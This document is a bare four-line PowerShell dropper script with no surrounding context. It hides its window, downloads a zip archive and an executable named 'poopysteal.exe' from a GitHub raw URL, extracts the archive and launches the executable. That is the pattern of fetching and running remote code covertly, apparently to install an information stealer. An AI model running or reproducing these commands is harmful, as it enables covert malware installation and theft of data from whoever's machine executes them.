powershell -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/_internal.zip' -OutFile .\poop.zip
powershell -WindowStyle Hidden Expand-Archive -Path poop.zip -DestinationPath .
powershell -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/poopysteal.exe' -OutFile .\poop.exe
powershell Invoke-Item .\poop.exe
